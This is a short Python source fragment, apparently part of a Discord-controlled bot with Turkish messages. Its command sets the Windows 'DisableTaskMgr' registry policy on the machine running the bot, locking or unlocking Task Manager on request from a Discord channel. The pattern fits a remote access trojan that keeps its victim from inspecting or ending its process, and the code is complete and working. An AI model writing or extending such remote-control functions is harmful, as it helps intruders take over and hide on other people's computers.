@client.command(name="gorevyoneticisikapat")
async def disable_task_manager(ctx, durum: str = "kapat"):
  """Görev Yöneticisi'ni kilitler veya açar.

  Kullanım: !gorevyoneticisikapat kapat VEYA !gorevyoneticisikapat ac
  """
  def set_taskmgr(state: int):
    try:
      reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
      try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE
        )
      except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)

      winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, state)
      winreg.CloseKey(key)
      return True
    except Exception as e:
      return False

  loop = asyncio.get_running_loop()

  if durum.lower() == "kapat":
    success = await loop.run_in_executor(None, set_taskmgr, 1)
    if success:
      await ctx.send(
          "🔒 Görev Yöneticisi başarıyla kilitlendi! (Ctrl+Shift+Esc devre dışı)"
      )
    else:
      await ctx.send("❌ İşlem başarısız.")

  elif durum.lower() == "ac":
    success = await loop.run_in_executor(None, set_taskmgr, 0)
    if success:
      await ctx.send("🔓 Görev Yöneticisi kilidi açıldı!")
    else:
      await ctx.send("❌ İşlem başarısız.")
  else:
    await ctx.send(
        "⚠️ Hatalı kullanım! `!gorevyoneticisikapat kapat` veya"
        " `!gorevyoneticisikapat ac` yazmalısın."
    )


